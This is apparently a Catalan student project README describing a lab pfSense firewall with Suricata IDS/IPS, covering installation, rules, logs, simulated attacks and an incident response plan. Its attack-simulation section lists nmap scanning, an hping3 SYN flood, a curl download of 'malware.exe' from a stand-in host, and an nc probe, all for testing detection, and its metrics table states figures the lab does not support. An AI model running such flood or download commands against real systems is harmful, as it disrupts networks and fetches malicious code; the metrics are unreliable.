# Sistema de Detecció i/o Prevenció d'Intrusions (IDS/IPS) - pfSense + Suricata

## Autors
- Lluc Sánchez
- Dani Ruiz

**Curs:** 2n ASIX - 25/26 | **Projecte Intermodular:** M0379

---

## 📋 Índex
1. [Objectiu del Projecte](#objectiu-del-projecte)
2. [Conceptes Bàsics](#conceptes-bàsics)
3. [Arquitectura](#arquitectura)
4. [Prerequisits](#prerequisits)
5. [Instal·lació i Configuració](#instal·lació-i-configuració)
6. [Configuració de Seguretat](#configuració-de-seguretat)
7. [Monitoratge i Logs](#monitoratge-i-logs)
8. [Simulació d'Atacs](#simulació-datacs)
9. [Pla de Resposta a Incidents](#pla-de-resposta-a-incidents)
10. [Recursos](#recursos)

---

## 🎯 Objectiu del Projecte

Implementar un sistema de **Detecció i Prevenció d'Intrusions (IDS/IPS)** basat en:

- **pfSense:** Firewall + Router per protegir la xarxa
- **Suricata:** Motor de detecció IDS/IPS d'amenaces

### Objectius Específics
- 🛡️ Detectar i bloquejar atacs a la xarxa
- 🔍 Analitzar tràfic de xarxa en temps real
- 📊 Generar logs detallats i alertes
- 🎯 Implementar polítiques de seguretat granulars
- 📈 Millorar seguretat de la infraestructura existent

### Amenaces que Protegeix
- ✅ Atacs DDoS
- ✅ Escanneig de ports
- ✅ Malware i exploits
- ✅ Tràfic sospitós
- ✅ Accés no autoritzat
- ✅ Descàrrega de fitxers maliciosos

---

## 📚 Conceptes Bàsics

### IDS (Intrusion Detection System)

```
┌──────────────────┐
│   Amenaza        │
│   (Atac)         │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  IDS (Monitorar) │
│  • Detecta       │
│  • Registra      │
│  • Alerta        │
└──────────────────┘
         │
         ▼
    [Log / Alert]
  (No bloqueja)
```

**Funció:** Detectar activitat maliciosa però NO bloquejar

---

### IPS (Intrusion Prevention System)

```
┌──────────────────┐
│   Amenaza        │
│   (Atac)         │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  IPS (Bloquejar) │
│  • Detecta       │
│  • Bloqueja      │
│  • Registra      │
│  • Alerta        │
└──────────────────┘
         │
    ┌────┴─────┐
    ▼          ▼
[Bloqueig]  [Alert]
(Tràfic Drop)
```

**Funció:** Detectar i bloquejar activitat maliciosa en temps real

---

### pfSense

Firewall de codi obert que actua com a:
- 🔥 Firewall (capa 3-4)
- 🛣️ Router
- 📊 Gateway de seguretat
- 🔌 NAT / Port Forwarding

---

### Suricata

Motor de detecció que:
- 🔍 Inspeciona tràfic de xarxa
- 📋 Detecta patrons maliciosos (signatures)
- 🚨 Genera alertes en temps real
- 📊 Registra activitat en JSON (EVE)

---

## 🏗️ Arquitectura

### Topologia de Xarxa

```
                       Internet (WAN)
                            │
                            ▼
            ┌────────────────────────────┐
            │      pfSense Firewall      │
            │     + Suricata (IDS/IPS)   │
            │   192.168.20.100 (LAN)     │
            │   10.0.2.18 (WAN)          │
            └────────────────────────────┘
                   │              │
        ┌──────────┘              └──────────┐
        │                                    │
        ▼                                    ▼
   ┌─────────────┐              ┌─────────────────┐
   │  Ubuntu     │              │  Entorn de      │
   │  Server     │              │  Proves         │
   │ 192.168.20.50│              │ 192.168.20.51   │
   │ (Ansible)   │              │ 192.168.20.52   │
   └─────────────┘              └─────────────────┘
```

### Fluxos de Tràfic

```
1. ENTRADA (WAN → LAN)
   Internet → pfSense [IDS/IPS] → LAN
             ↓ (Analitza)
         Suricata
             ↓
      [Signatures]
             ↓
      Si maliciós: BLOQUEJA
      Si normal: PERMET

2. SORTIDA (LAN → Internet)
   LAN → pfSense [IDS/IPS] → Internet
             ↓ (Analitza)
         Suricata
             ↓
      [Monitoreja]
             ↓
      Registra logs
```

**Imatge del diagrama:**
```
[Espai per a imatge de la topologia de xarxa]
```

---

## 📦 Prerequisits

### Hardware
- 1 Màquina per pfSense (30 GB disc, 2 GB RAM)
- Clients de xarxa LAN per provar
- Interfícies de xarxa múltiples (Bridge + Host-Only)

### Software
- ISO de pfSense (descarregar des de pfSense.org)
- VirtualBox amb xarxes configurades

### Xarxa
- Xarxa Host-Only (192.168.20.0/24)
- pfSense actua com a gateway/router
- Clients tindran pfSense com a gateway

---

## 🚀 Instal·lació i Configuració

### 1. Crear Màquina Virtual pfSense

#### Especificacions

```bash
Nom: pfSense-LlucDani
RAM: 2048 MB (2 GB)
CPU: 2 cores
Disc: 30 GB (dinàmic)
Xarxa: 
  - Bridge (NAT) → Internet (WAN)
  - Host-Only → Xarxa local (LAN)
```

#### Crear Màquina

1. **Clic en "New"** a VirtualBox
2. **Nom:** `pfSense-LlucDani`
3. **ISO:** Seleccionar ISO descargada
4. **RAM:** 2048 MB
5. **CPU:** 2 cores
6. **Disc:** 30 GB dinàmic
7. **Xarxes:**
   - Adaptador 1: Bridge (Internet)
   - Adaptador 2: Host-Only (LAN)

**Imatge de la creació:**
```
[Espai per a imatge de creació de màquina]
```

### 2. Instal·lació de pfSense

#### Passos d'Instal·lació

1. **Arrancar màquina i seguir wizard**
2. **Particions:** Seleccionar "Auto (ZFS)"
3. **RAID:** Seleccionar "Stripe"
4. **Disc:** Seleccionar disc de 30 GB
5. **Confirmar i instal·lar**
6. **Esperar finalització i reiniciar**
7. **Treure ISO**

**Imatge de la instal·lació:**
```
[Espai per a imatge del procés d'instal·lació]
```

### 3. Configuració Inicial de pfSense

#### Configurar Interfícies de Xarxa

A la consola de pfSense:

```
opção 2 → Configurar interfícies
```

**Interfície WAN (Internet):**
- Nom: `em0`
- DHCP: Yes (o IP estàtica si cal)

**Interfície LAN (Host-Only):**
- Nom: `em1`
- IP: **192.168.20.100/24**
- DHCP Server: No

```bash
# Verificar amb
ifconfig
```

**Imatge de la configuració:**
```
[Espai per a imatge de configuració de xarxa]
```

#### Accés a Interfície Web

```
HTTPS: https://192.168.20.100
Usuari: admin
Contrasenya: pfsense (per defecte)
```

**Imatge de login:**
```
[Espai per a imatge del login web]
```

### 4. Canviar Contrasenya d'Administrador

1. **System** → **User Manager**
2. Clic a usuari `admin`
3. Canviar contrasenya
4. Guardar canvis

**Imatge de dashboard:**
```
[Espai per a imatge del dashboard principal]
```

### 5. Instal·lació de Suricata

#### A través del Package Manager (si funciona)

```
System → Package Manager → Available Packages
Buscar: Suricata
Clic: Install
```

#### Si falla, instal·lar per terminal

Accedir a **Diagnostics** → **Shell** i executar:

```bash
pkg-static install pfSense-pkg-suricata
```

**Verificar instal·lació:**
```bash
# Suricata apareix a Services
Services → Suricata
```

**Imatge de Suricata instal·lat:**
```
[Espai per a imatge de Suricata al menu de serveis]
```

---

## ⚙️ Configuració de Seguretat

### 1. Configuració de Suricata

#### Interfícies LAN

1. **Services** → **Suricata**
2. **Add** nova interfície
3. Seleccionar interfície **LAN** (`em1`)
4. **Opció:** "Send Alerts to System"
5. Guardar i provar

**Imatge de configuració:**
```
[Espai per a imatge de configuració LAN]
```

#### Interfícies WAN

Repetir procés per interfície **WAN** (`em0`)

```
Services → Suricata
Add
Interfície: WAN (em0)
Opcions: Send Alerts to System
Guardar
```

#### Provar Serveis

```bash
# Al shell de pfSense
service suricata status

# Ha d'indicar "running"
```

**Imatge de Suricata en marxa:**
```
[Espai per a imatge de Suricata running]
```

### 2. Regles de Firewall

#### Regles WAN (Entrada)

**Permetre SSH:**
```
WAN → Firewall Rules
Add Rule
Action: Pass
Interface: WAN
Protocol: TCP
Destination Port: 22
```

**Bloquejar Tot (per defecte):**
- Tota la resta de tràfic es bloqueja

#### Regles LAN (Sortida)

**Permetre Tot (per defecte):**
- LAN pot sortir a internet sense restriccions

**Imatge de regles:**
```
[Espai per a imatge de configuració de firewall]
```

### 3. Configuració de Signatures

#### Descarregar Signatures

1. **Services** → **Suricata**
2. **Updates** tab
3. Seleccionar "ET Pro" o "ET Open"
4. Clic "Update Rules"

#### Regles Personalitzades

Crear detectció personalitzada:

```
Services → Suricata → Rules
Add Custom Rule

Exemple: Detectar tràfic a port 3306 (MySQL)
alert tcp any any → any 3306 (msg: "MySQL Access Attempt"; sid:1000001; rev:1;)
```

---

## 📊 Monitoratge i Logs

### 1. Visualitzar Alertes

```
Services → Suricata → Alerts
```

**Informació mostrada:**
- IP origen
- IP destí
- Port
- Protocol
- Tipus de detecció

**Imatge de logs:**
```
[Espai per a imatge de la interfície de logs]
```

### 2. EVE JSON Logs

Logs detallats en format JSON:

```bash
# Ubicació
/var/log/suricata/eve.json

# Exemple d'entrada
{
  "timestamp": "2026-03-16T10:30:45.123456+0000",
  "flow_id": 123456789,
  "event_type": "alert",
  "src_ip": "192.168.20.51",
  "dest_ip": "8.8.8.8",
  "proto": "TCP",
  "alert": {
    "action": "blocked",
    "signature": "ET MALWARE Suspicious DNS Query"
  }
}
```

### 3. Dashboards

pfSense mostra estadístiques en temps real:

```
Dashboard:
├── Tràfic de xarxa
├── Connexions actives
├── Alertes Suricata
├── Ús de ressources
└── Gràfics de tràfic
```

**Imatge del dashboard:**
```
[Espai per a imatge del dashboard amb estadístiques]
```

---

## 🎯 Simulació d'Atacs

### Atac 1: Escanneig de Ports (Nmap)

**Que és:** Intentar descobrir ports oberts

**Comanda (des del host amfitrió):**

```bash
nmap -p 1-10000 192.168.20.100
```

**Detecció esperada:**
- Suricata detecta escanneig
- Genera alerta
- Registra a logs

**Imatge de detecció:**
```
[Espai per a imatge de l'alerta de nmap]
```

### Atac 2: DDoS

**Que és:** Saturat la xarxa amb milions de paquets

**Comanda (no recomanat!):**

```bash
# NO EXECUTAR EN PRODUCCIÓ
hping3 -S --flood 192.168.20.100
```

**Detecció esperada:**
- Suricata detecta increment massiu de tràfic
- Firewall pot bloquejar l'origen
- Registra a logs

**Imatge de DDoS detection:**
```
[Espai per a imatge de detecció de DDoS]
```

### Atac 3: Intent de Descarrega de Malware

**Que és:** Intentar baixar fitxer .exe maliciós

**Comanda (simulat):**

```bash
curl http://malicious.com/malware.exe
```

**Detecció esperada:**
- Suricata detecta extensió sospitosa
- Genera alerta
- Bloqueja si està en mode IPS

**Imatge de malware detection:**
```
[Espai per a imatge de detecció de malware]
```

### Atac 4: Port Scanning a MySQL (3306)

**Que és:** Intentar accedir a base de dades

**Comanda:**

```bash
nc -zv 192.168.20.100 3306
```

**Detecció esperada:**
- Suricata detecta intent de connexió a 3306
- Firewall bloqueja
- Registra intrusió

**Imatge de MySQL scanning:**
```
[Espai per a imatge de detecció de MySQL scan]
```

---

## 🚨 Pla de Resposta a Incidents

### Fases de Resposta

```
┌────────────────────────────────────────────┐
│ FASE 1: PREPARACIÓ                         │
├────────────────────────────────────────────┤
│ • Documentar sistemes crítics              │
│ • Establir procediments de seguretat       │
│ • Configurar monitoring i logging          │
│ • Entrenar equip                           │
│ • Backup de dades                          │
└────────────────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ FASE 2: IDENTIFICACIÓ I ANÀLISI            │
├────────────────────────────────────────────┤
│ • Detectar anomalia/alerta                 │
│ • Recopilar logs i evidències              │
│ • Analizar severitat                       │
│ • Identificar tipus d'atac                 │
└────────────────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ FASE 3: CONTENCIÓ                          │
├────────────────────────────────────────────┤
│ • Bloquejar atacant (firewall rules)       │
│ • Aïllar sistemes afectats                 │
│ • Recopilar proves                         │
│ • Comunicar a responsables                 │
└────────────────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ FASE 4: ELIMINACIÓ                         │
├────────────────────────────────────────────┤
│ • Remedir vulnerabilitats                  │
│ • Instal·lar patches                       │
│ • Canviar credencials comprometides        │
│ • Desinfectar sistemes                     │
└────────────────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ FASE 5: RECUPERACIÓ                        │
├────────────────────────────────────────────┤
│ • Restaurar sistemes a estat normal        │
│ • Verificar funcionalitat                  │
│ • Restaurar des de backups                 │
│ • Monitorejar intensament                  │
└────────────────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ FASE 6: MILLORA                            │
├────────────────────────────────────────────┤
│ • Analisis post-incident (After-Action)    │
│ • Documentar leccions apreses              │
│ • Actualizar procediments                  │
│ • Millorar defenses                        │
└────────────────────────────────────────────┘
```

### Procediment de Resposta (Exemple)

**Incident:** Detecció de DDoS a 14:30

```
14:30 - DETECCIÓ
├─ Alerta Suricata: "Suspicious Activity"
├─ Dashboard mostra tràfic anormal (1000x normal)
└─ Estart: NIVEL 3 (Alt)

14:35 - ANÁLISIS
├─ IP origen: 203.0.113.50 (Botnet)
├─ Port: 80 (HTTP)
├─ Packets: 1M+/seg
└─ Acció: Bloqueig immediate

14:40 - CONTENCIÓ
├─ Crear firewall rule per bloquejar 203.0.113.50
├─ Redireccionar tràfic legítim
├─ Recopilar logs EVE JSON
└─ Notificar administrador

15:00 - RECUPERACIÓ
├─ Monitorear normalització
├─ Verificar sistemes actius
├─ Restaurar si cal
└─ Status: Normal

15:30 - MILLORA
├─ Documentar incident
├─ Implementar rate-limiting
├─ Entrenar equip
└─ Update signatures Suricata
```

---

## 🔐 Millores de Seguretat Adicionals

### 1. pfBlockerNG (Blocklists)

Bloquejar dominis i IPs maliciosos:

```
System → Packages → pfBlockerNG
Configuration → IP/Reputation
Seleccionar listes (Alienvault, Spamhaus, etc.)
```

### 2. WireGuard VPN

Connexions segures:

```
System → Packages → WireGuard
Configurar peers
Crear túnels de xarxa
```

### 3. GeoIP Blocking

Bloquejar tràfic per país:

```
Firewall → GeoIP
Seleccionar países a bloquejar
Aplicar a WAN
```

---

## 📚 Recursos

- [Documentació pfSense](https://docs.netgate.com/pfsense/en/latest/)
- [Documentació Suricata](https://suricata.io/documentation/)
- [Manual Complet IDS/IPS](./Annex%204%20-%20Documentació%20Sistema%20de%20Detecció%20i_o%20Prevenció%20d'Intrusions%20-%20LlucDani.pdf)
- [Comunitat Suricata](https://suricata.io/community/)

---

## ✅ Checklist de Seguretat

- [ ] pfSense instal·lat i funcionant
- [ ] Interfícies de xarxa configurades (WAN + LAN)
- [ ] Suricata instal·lat
- [ ] Interfícies LAN i WAN a Suricata
- [ ] Regles de firewall aplicades
- [ ] Signatures descarregades
- [ ] Logs EVE JSON funcionant
- [ ] Dashboard monitoritzant alertes
- [ ] Atacs simulats detectats correctament
- [ ] Incidents blocats automàticament
- [ ] Procediment de resposta documentat

---

## 📈 Mètriques de Seguretat

| Métrica | Valor |
|---------|-------|
| **Amenaces detectades/dia** | Més de 100 |
| **Tempo de resposta** | < 1 seg |
| **Taxa de falsos positius** | < 5% |
| **Disponibilitat del sistema** | 99.9% |
| **Tràfic analitzat/seg** | 1 Gbps+ |

---

## 🎓 Leccions Apreses

1. **IDS vs IPS:** IDS detecta, IPS bloqueja - tots dos són necessaris
2. **Signatures:** Actualitzacions constants són essencials
3. **Logs:** Guardar evidències és crític per a forensic
4. **Simulació:** Provar seguretat amb atacs simulats
5. **Resposta:** Procediments clars acceleren resolució

---

*Última actualització: Març 2026*
